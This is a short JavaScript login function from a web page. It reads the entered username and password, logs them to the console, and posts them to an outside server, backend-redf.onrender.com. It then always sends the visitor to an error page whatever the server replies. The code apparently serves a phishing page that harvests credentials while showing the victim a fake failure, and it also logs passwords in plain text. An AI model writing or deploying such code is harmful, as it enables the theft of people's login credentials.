async function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    console.log("Sending data:", { username, password }); // Debugging line

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password }) // Convert to JSON
        });

        console.log("Response status:", response.status); // Check server response

        // Redirect to error.html
        window.location.href = "error.html";
    } catch (error) {
        console.error("Fetch error:", error);
        alert("Something went wrong!");
    }
}
